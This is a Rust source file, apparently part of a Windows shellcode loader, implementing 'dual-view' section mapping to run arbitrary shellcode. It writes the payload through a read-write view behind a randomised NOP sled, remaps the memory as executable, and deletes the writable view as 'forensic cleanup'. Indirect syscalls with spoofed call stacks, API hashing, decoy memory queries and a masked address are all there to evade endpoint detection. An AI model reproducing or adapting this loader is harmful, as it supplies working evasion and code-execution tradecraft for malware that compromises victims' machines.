#![allow(non_snake_case)]

use core::ptr;
use core::sync::atomic::{AtomicUsize, Ordering};
use winapi::ctypes::c_void;
use winapi::shared::ntdef::{HANDLE, NTSTATUS};

use crate::hash::fnv1a_hash;
use crate::nt::OBJECT_ATTRIBUTES;

const H_NT_CREATE_SECTION: u64 = fnv1a_hash(b"NtCreateSection");
const H_NT_MAP_VIEW_OF_SECTION: u64 = fnv1a_hash(b"NtMapViewOfSection");
const H_NT_UNMAP_VIEW_OF_SECTION: u64 = fnv1a_hash(b"NtUnmapViewOfSection");
const H_NT_CLOSE: u64 = fnv1a_hash(b"NtClose");
const H_NT_QUERY_VM: u64 = fnv1a_hash(b"NtQueryVirtualMemory");

const SECTION_ALL_ACCESS: u32 = 0x000F_001F;
const SEC_COMMIT: u32 = 0x0800_0000;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x20;
const VIEW_UNMAP: u32 = 2;

const PROC_SELF: HANDLE = (-1isize) as HANDLE;

static MAPPED_ADDR: AtomicUsize = AtomicUsize::new(0);
static MAPPED_SIZE: AtomicUsize = AtomicUsize::new(0);

#[inline]
unsafe fn spoofed_syscall(
    api_hash: u64,
    arg1: u64, arg2: u64, arg3: u64, arg4: u64,
    arg5: u64, arg6: u64, arg7: u64, arg8: u64,
    arg9: u64, arg10: u64,
) -> NTSTATUS {
    let (ssn, stub) = match crate::ssn_resolver::resolve_ssn_by_hash(api_hash) {
        Some(s) => s,
        None => return -1,
    };
    let gadget = crate::syscalls::select_gadget_for_stub(stub);
    if gadget == 0 { return -1; }
    let chain = crate::stack_spoof::build_zero_depth_chain();
    let chain_ptr = &chain as *const crate::stack_spoof::SyntheticChain as u64;
    crate::syscalls::indirect_syscall_spoofed(
        ssn, gadget, chain_ptr,
        arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9, arg10, 0,
    )
}

unsafe fn decoy_query_vm() {
    let ntdll_base = match crate::hash::get_module_by_hash(crate::hash::H_NTDLL) {
        Some(m) => m as u64,
        None => return,
    };
    let mut mbi = [0u8; 48];
    let mut ret_len: usize = 0;
    let _ = spoofed_syscall(
        H_NT_QUERY_VM,
        PROC_SELF as u64,
        ntdll_base,
        0u64,
        mbi.as_mut_ptr() as u64,
        48u64,
        &mut ret_len as *mut _ as u64,
        0, 0, 0, 0,
    );
}

unsafe fn nt_create_section_commit(
    section_handle: *mut HANDLE,
    section_size: usize,
) -> (NTSTATUS, u32) {
    let oa = OBJECT_ATTRIBUTES::null();
    let mut max_size: i64 = section_size as i64;

    let status = spoofed_syscall(
        H_NT_CREATE_SECTION,
        section_handle as u64,
        SECTION_ALL_ACCESS as u64,
        &oa as *const _ as u64,
        &mut max_size as *mut _ as u64,
        0x40u64,
        SEC_COMMIT as u64,
        0,
        0, 0, 0,
    );
    (status, PAGE_READWRITE)
}

unsafe fn nt_map_view(
    section_handle: HANDLE,
    base: *mut *mut c_void,
    size: *mut usize,
    protection: u32,
) -> NTSTATUS {
    let mut section_offset: i64 = 0;

    spoofed_syscall(
        H_NT_MAP_VIEW_OF_SECTION,
        section_handle as u64,
        PROC_SELF as u64,
        base as u64,
        0,
        0,
        &mut section_offset as *mut _ as u64,
        size as u64,
        VIEW_UNMAP as u64,
        0,
        protection as u64,
    )
}

unsafe fn nt_unmap_view(base: *mut c_void) -> NTSTATUS {
    spoofed_syscall(
        H_NT_UNMAP_VIEW_OF_SECTION,
        PROC_SELF as u64,
        base as u64,
        0, 0, 0, 0, 0, 0, 0, 0,
    )
}

unsafe fn nt_close_handle(handle: HANDLE) -> NTSTATUS {
    spoofed_syscall(H_NT_CLOSE, handle as u64, 0, 0, 0, 0, 0, 0, 0, 0, 0)
}

pub(crate) unsafe fn dual_view_write(data: &[u8]) -> Option<*mut c_void> {
    if data.is_empty() {
        return None;
    }

    let size = data.len();
    crate::debug_log!("[DV] Dual-view mapping: {} bytes", size);

    let page_size: usize = 0x1000;
    let min_section_size: usize = 0x10000;
    let aligned_size = ((size + page_size - 1) / page_size) * page_size;
    let section_size = if aligned_size < min_section_size {
        min_section_size
    } else {
        aligned_size
    };

    decoy_query_vm();

    let mut section_handle: HANDLE = ptr::null_mut();

    let (status, write_protection) = nt_create_section_commit(&mut section_handle, section_size);

    if status < 0 || section_handle.is_null() {
        crate::debug_log!("[DV] NtCreateSection(SEC_COMMIT) failed: 0x{:X}", status as u32);
        return None;
    }
    crate::debug_log!(
        "[DV] Anonymous section created: {} bytes (write_prot=0x{:02X})",
        section_size, write_protection
    );

    let mut rw_base: *mut c_void = ptr::null_mut();
    let mut rw_size: usize = section_size;

    let status = nt_map_view(
        section_handle,
        &mut rw_base,
        &mut rw_size,
        write_protection,
    );

    if status < 0 || rw_base.is_null() {
        crate::debug_log!("[DV] RW view map failed: 0x{:X}", status as u32);
        nt_close_handle(section_handle);
        return None;
    }
    crate::debug_log!("[DV] RW view: 0x{:X} ({} bytes)", rw_base as usize, rw_size);

    let entry_offset: usize = 0x200;
    let available = rw_size.saturating_sub(entry_offset);

    if available < size {
        crate::debug_log!(
            "[DV] Section too small: need {} + 0x200, have {}",
            size, rw_size
        );
        nt_unmap_view(rw_base);
        nt_close_handle(section_handle);
        return None;
    }

    {
        let tsc: u64;
        core::arch::asm!(
            "rdtsc", "shl rdx, 32", "or rax, rdx",
            out("rax") tsc, out("rdx") _,
            options(nostack, nomem, preserves_flags)
        );

        let nop_patterns: [&[u8]; 8] = [
            &[0x90],
            &[0x66, 0x90],
            &[0x0F, 0x1F, 0x00],
            &[0x0F, 0x1F, 0x40, 0x00],
            &[0x87, 0xDB],
            &[0x89, 0xC0],
            &[0x89, 0xC9],
            &[0x89, 0xD2],
        ];

        let landing_ptr = rw_base as *mut u8;
        let mut prng = tsc;
        let mut i = 0usize;
        while i + 4 < entry_offset {
            prng ^= prng << 13;
            prng ^= prng >> 7;
            prng ^= prng << 17;

            prng ^= prng << 17;

            let idx = if crate::config::advanced_behavior_randomization() {
                (prng as usize) % nop_patterns.len()
            } else {
                0
            };
            let pat = nop_patterns[idx];

            for &b in pat {
                ptr::write_volatile(landing_ptr.add(i), b);
                i += 1;
            }
        }
    }

    let write_addr = (rw_base as *mut u8).add(entry_offset);

    for i in 0..size {
        ptr::write_volatile(write_addr.add(i), data[i]);
    }

    if size < available {
        ptr::write_volatile(write_addr.add(size), 0xC3u8);

        let fill_start = size + 1;
        let mut fi = fill_start;
        while fi < available {
            ptr::write_volatile(write_addr.add(fi), 0xCCu8);
            fi += 1;
        }
    }

    core::sync::atomic::compiler_fence(core::sync::atomic::Ordering::SeqCst);

    crate::debug_log!("[DV] Shellcode written to RW view at offset +0x{:X}", entry_offset);

    crate::timer_sleep::timer_sleep_jitter(2, 6);
    decoy_query_vm();

    let mut rx_base: *mut c_void = ptr::null_mut();
    let mut rx_size: usize = section_size;

    let status = nt_map_view(
        section_handle,
        &mut rx_base,
        &mut rx_size,
        PAGE_EXECUTE_READ,
    );

    if status < 0 || rx_base.is_null() {
        crate::debug_log!("[DV] RX view map failed: 0x{:X}", status as u32);
        nt_unmap_view(rw_base);
        nt_close_handle(section_handle);
        return None;
    }
    crate::debug_log!("[DV] RX view: 0x{:X} ({} bytes)", rx_base as usize, rx_size);

    nt_unmap_view(rw_base);
    crate::debug_log!("[DV] RW view unmapped (forensic cleanup)");

    let rx_entry = (rx_base as *mut u8).add(entry_offset) as *mut c_void;

    let _ = crate::syscalls::nt_flush_instruction_cache(
        PROC_SELF,
        rx_entry,
        size,
    );

    nt_close_handle(section_handle);

    let masked_addr = (rx_entry as usize) ^ (crate::stack_spoof::pool_key() as usize);
    MAPPED_ADDR.store(masked_addr, Ordering::SeqCst);
    MAPPED_SIZE.store(size, Ordering::SeqCst);

    crate::debug_log!(
        "[DV] Dual-view complete: {} bytes at MEM_MAPPED RX @ 0x{:X}",
        size, rx_entry as usize
    );

    Some(rx_entry)
}

pub(crate) fn get_region() -> Option<(*mut c_void, usize)> {
    let masked = MAPPED_ADDR.load(Ordering::SeqCst);
    let size = MAPPED_SIZE.load(Ordering::SeqCst);
    if masked == 0 || size == 0 {
        None
    } else {
        let addr = masked ^ (crate::stack_spoof::pool_key() as usize);
        Some((addr as *mut c_void, size))
    }
}

pub(crate) unsafe fn cleanup_mapped_view() {
    let masked = MAPPED_ADDR.load(Ordering::SeqCst);
    if masked == 0 {
        return;
    }

    let entry_addr = masked ^ (crate::stack_spoof::pool_key() as usize);

    let alloc_granularity: usize = 0x10000;
    let view_base = entry_addr & !(alloc_granularity - 1);

    if view_base == 0 {
        return;
    }

    let status = nt_unmap_view(view_base as *mut c_void);

    if status >= 0 {
        crate::debug_log!("[DV] RX view cleaned up (post-execution)");
    } else {
        crate::debug_log!("[DV] RX view cleanup failed: 0x{:X}", status as u32);
    }

    MAPPED_ADDR.store(0, Ordering::SeqCst);
    MAPPED_SIZE.store(0, Ordering::SeqCst);
}

